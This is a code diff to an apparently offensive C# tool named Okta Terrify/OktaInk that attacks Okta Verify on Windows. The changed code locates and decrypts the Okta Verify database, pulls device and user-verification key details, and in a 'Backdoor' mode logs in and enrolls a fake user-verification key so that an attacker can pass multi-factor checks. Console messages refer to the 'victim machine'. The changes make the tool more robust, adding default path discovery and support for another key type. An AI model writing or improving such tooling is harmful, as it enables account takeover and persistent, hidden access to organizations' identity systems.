@@ -137,54 +137,58 @@ namespace OktaVerify {
 
             if(dbKey == null)
                 dbKey = GetLegacyDatabaseKey(sid);
-            
+
             var db = new SQLiteConnection(new SQLiteConnectionString(databasePath, SQLiteOpenFlags.ReadOnly, false, key: dbKey));
             var deviceEnrollments = db.Query<DeviceEnrollment>("SELECT * from DeviceEnrollment", new object[] { });
             var authenticatorVerificationMethods = db.Query<AuthenticatorVerificationMethod>("SELECT * from AuthenticatorVerificationMethod", new object[] { });
             var orgInfos = db.Query<OrganizationInformation>("SELECT Id, Name, Domain, ClientInstanceId, SerializedOrgKeys, SerializedDeviceKey, DeviceId from OrganizationInformation", new object[] { });
-            var deviceKeys = Encoding.UTF8.GetString(Convert.FromBase64String(authenticatorVerificationMethods[0].SerializedCredentials));
-            var deviceKeysJson = JsonConvert.DeserializeObject<IEnumerable<Dictionary<string, dynamic>>>(deviceKeys);
             var oktaVerifyInfo = db.Query<OktaVerifyInformation>("SELECT * from OktaVerifyInformation", new object[] { }).FirstOrDefault();
             var userInfo = db.Query<UserInformation>("SELECT * from UserInformation", new object[] { }).FirstOrDefault();
             var deviceKeyList = new List<Key>();
+   
 
-            foreach(var key in deviceKeysJson) {
-                deviceKeyList.Add(new Key() {
-                    KeyId = key["Value"]["id"].ToString(),
-                    Sandboxed = (bool)key["Value"]["sndbxd"] || ((int)key["Value"]["prtct"] == 2),
-                    Type = (KeyType)key["Key"]
-                }); 
+            if (authenticatorVerificationMethods.Count > 0) {
+                var deviceKeys = Encoding.UTF8.GetString(Convert.FromBase64String(authenticatorVerificationMethods[0].SerializedCredentials));
+                var deviceKeysJson = JsonConvert.DeserializeObject<IEnumerable<Dictionary<string, dynamic>>>(deviceKeys);
+
+                foreach (var key in deviceKeysJson) {
+                    deviceKeyList.Add(new Key() {
+                        KeyId = key["Value"]["id"].ToString(),
+                        Sandboxed = (bool)key["Value"]["sndbxd"] || ((int)key["Value"]["prtct"] == 2),
+                        Type = (KeyType)key["Key"]
+                    });
+                }
             }
 
-            var deviceKey = JsonConvert.DeserializeObject<Dictionary<string, dynamic>>(Encoding.UTF8.GetString(Convert.FromBase64String(orgInfos[0].SerializedDeviceKey.Split(new[] { '|' })[1])));
-            deviceKeyList.Add(new Key() {
-                KeyId = deviceKey["id"].ToString(),
-                Sandboxed = (bool)deviceKey["sndbxd"] || ((int)deviceKey["prtct"] == 2),
-                Type = KeyType.DeviceAttestation
-            });
+            if (orgInfos.Count > 0) {
+                var deviceKey = JsonConvert.DeserializeObject<Dictionary<string, dynamic>>(Encoding.UTF8.GetString(Convert.FromBase64String(orgInfos[0].SerializedDeviceKey.Split(new[] { '|' })[1])));
+                deviceKeyList.Add(new Key() {
+                    KeyId = deviceKey["id"].ToString(),
+                    Sandboxed = (bool)deviceKey["sndbxd"] || ((int)deviceKey["prtct"] == 2),
+                    Type = KeyType.DeviceAttestation
+                });
+            }
 
             return new OktaSignParams() {
-                DeviceEnrollmentId = deviceEnrollments[0].Id,
-                UserId = deviceEnrollments[0].UserId,
-                MethodEnrollmentId = authenticatorVerificationMethods[0].Id,
+                DeviceEnrollmentId = deviceEnrollments.Count > 0 ? deviceEnrollments[0].Id : "None",
+                UserId = deviceEnrollments.Count > 0 ? deviceEnrollments?[0].UserId : "None",
+                AuthenticatorLink = deviceEnrollments.Count > 0 ? deviceEnrollments[0].AuthenticatorLink : "None",
+                DeviceLink = deviceEnrollments.Count > 0 ? deviceEnrollments[0].DeviceLink : "None",
+                EnrollmentLink = deviceEnrollments.Count > 0 ? deviceEnrollments[0].EnrollmentLink : "None",
+                ExternalUrl = deviceEnrollments.Count > 0 ? deviceEnrollments[0].ExternalUrl : "None",
+                AuthenticatorId = deviceEnrollments.Count > 0 ? deviceEnrollments[0].AuthenticatorId : "None",
+                MethodEnrollmentId = authenticatorVerificationMethods.Count > 0 ? authenticatorVerificationMethods[0].Id : "None",
                 SandboxName = oktaVerifyInfo?.SandboxName,
                 InstanceIdentifier = oktaVerifyInfo?.InstanceIdentifier,
                 KeyProtectionSeed = oktaVerifyInfo?.ApplicationKeyProtectionSeed,
-                Keys = deviceKeyList,
-                ExternalUrl = deviceEnrollments[0].ExternalUrl,
-                AuthenticatorLink = deviceEnrollments[0].AuthenticatorLink,
-                DeviceLink = deviceEnrollments[0].DeviceLink,
-                EnrollmentLink = deviceEnrollments[0].EnrollmentLink,
-                ClientInstanceId = orgInfos[0].ClientInstanceId,
-                DeviceId = orgInfos[0].DeviceId,
-                Domain = orgInfos[0].Domain,
-                AuthenticatorId = deviceEnrollments[0].AuthenticatorId,
+                Keys = deviceKeyList,                             
+                ClientInstanceId = orgInfos.Count > 0 ? orgInfos?[0].ClientInstanceId : "None", 
+                DeviceId = orgInfos.Count > 0 ? orgInfos?[0].DeviceId : "None",
+                Domain = orgInfos.Count > 0 ? orgInfos?[0].Domain : "None",                
                 DatabaseKey = dbKey,
-                Email = userInfo.Email
+                Email = userInfo?.Email
             };
-        }
-
-  
+        }  
 
         static byte[] GetLegacyDatabaseKey(string sid) {            
             byte[] sidStr = Encoding.ASCII.GetBytes(sid);
@@ -360,26 +364,40 @@ namespace OktaVerify {
                 log.Error("Sign, Backdoor, Import and Info options are exclusive.  Specify only one");
                 return;
             }
-   
-            if(databasePath != null) {
-                var dbFileName = Path.GetFileName(databasePath);
-                if (dbFileName == "OVStore.db") {
-                    if (sid == null) {
-                        Console.WriteLine("[!] Database file looks like the legacy format, SID argument needed");
-                        return;
-                    }
-                } else if (dbFileName == "DataStore.db") {
-                    if (dbKey == null) {
-                        Console.WriteLine("[!] Database file looks like the newer format, supply database key with dbkey argument.  This can be obtained using the following command on the victim machine:\n\rOktaInk -o DumpDBKey");
-                        return;
-                    }
-                } else {
-                    Console.WriteLine("[!] Database file name should be OVStore.db or DataStore.db");
+
+            if (databasePath == null) {
+                databasePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Okta\\OktaVerify\\");
+
+                if (File.Exists(Path.Combine(databasePath, "OVStore.db")))
+                    databasePath = Path.Combine(databasePath, "OVStore.db");
+                else if (File.Exists(Path.Combine(databasePath, "DataStore.db")))
+                    databasePath = Path.Combine(databasePath, "DataStore.db");
+                else {
+                    Console.WriteLine($"[!] No database file specified, and cant find one inside {databasePath}");
                     return;
-                } 
-                
-                signingInfo = GetDatabaseInfo(sid, databasePath, dbKey);                
+                }
+
+                Console.WriteLine($"[=] No database file specified, using default {databasePath}");
             }
+            
+            var dbFileName = Path.GetFileName(databasePath);
+            if (dbFileName == "OVStore.db") {
+                if (sid == null) {
+                    Console.WriteLine("[!] Database file looks like the legacy format, SID argument needed");
+                    return;
+                }
+            } else if (dbFileName == "DataStore.db") {
+                if (dbKey == null) {
+                    Console.WriteLine("[!] Database file looks like the newer format, supply database key with dbkey argument.  This can be obtained using the following command on the victim machine:\n\rOktaInk -o DumpDBKey");
+                    return;
+                }
+            } else {
+                Console.WriteLine("[!] Database file name should be OVStore.db or DataStore.db");
+                return;
+            } 
+                
+            signingInfo = GetDatabaseInfo(sid, databasePath, dbKey);                
+            
 
             log.Info("Okta Terrify is starting....");
             var httpServer = new LoopbackHttpListener(new int[] { 65112, 8769 }, new Func<string, Task<bool>>(SendChallengeResponse));
@@ -419,9 +437,7 @@ namespace OktaVerify {
                     Console.WriteLine("[!] Both SID and store database arguments needed");
                     return;
                 }
-
-                var dbFileName = Path.GetFileName(databasePath);
-                                         
+                                                        
                 httpServer.Start();
                 var consoleReader = ThreadedConsoleReader.ConsoleLoop();
                 var backdoorKey = GetBackdoorKey();
@@ -443,7 +459,7 @@ namespace OktaVerify {
                         log.Info($"Authenticated as user {loginResult.User.FindFirst("preferred_username").Value}, enrolling a fake userVerify TPM key");
                         httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", loginResult.AccessToken);
                         var jwk = GenerateNewUserVerificationKey();
-                        var currentUserVerifyKey = signingInfo.Keys.FirstOrDefault(k => k.Type == KeyType.UserVerification);
+                        var currentUserVerifyKey = signingInfo.Keys.FirstOrDefault(k => k.Type == KeyType.UserVerification || k.Type == KeyType.UserVerificationBioOrPin);
                         var impersonate = currentUserVerifyKey.Sandboxed ? ($" --impersonate {signingInfo.SandboxName}:{Convert.ToBase64String(signingInfo.InstanceIdentifier)}") : "";
                         Jwk currentUserVerifyJWK = null;
 
@@ -480,13 +496,23 @@ namespace OktaVerify {
                             }
                         };
 
-                        authenticator.methods.Add(new Method() {
-                            type = "signed_nonce",
-                            keys = new Keys() {
-                                userVerificationBioOrPin = jwk,
-                                userVerification = currentUserVerifyJWK != null ? currentUserVerifyJWK : jwk
-                            }
-                        });
+                        if (currentUserVerifyKey.Type == KeyType.UserVerification) {
+                            authenticator.methods.Add(new Method() {
+                                type = "signed_nonce",
+                                keys = new Keys() {
+                                    userVerificationBioOrPin = jwk,
+                                    userVerification = currentUserVerifyJWK != null ? currentUserVerifyJWK : jwk
+                                }
+                            });
+                        } else {
+                            authenticator.methods.Add(new Method() {
+                                type = "signed_nonce",
+                                keys = new Keys() {
+                                    userVerification = jwk,
+                                    userVerificationBioOrPin = currentUserVerifyJWK != null ? currentUserVerifyJWK : jwk
+                                }
+                            });
+                        }
                      
                         var str = JsonConvert.SerializeObject(authenticator, Formatting.None);
                         var result = await httpClient.PutAsync(signingInfo.EnrollmentLink, new StringContent(str, Encoding.UTF8, "application/json"));
@@ -513,12 +539,7 @@ namespace OktaVerify {
                 if (sid == null) {
                     sid = WindowsIdentity.GetCurrent().User.ToString();
                     Console.WriteLine($"[=] No SID specified, using current SID {sid}");
-                }
-
-                if (databasePath == null) {
-                    databasePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Okta\\OktaVerify\\OVStore.db");
-                    Console.WriteLine($"[=] No database file specified, using default {databasePath}");
-                }
+                }   
 
                 Console.WriteLine("\n");
                 Console.WriteLine($"Database Encryption Key: {ToHex(signingInfo.DatabaseKey)}");
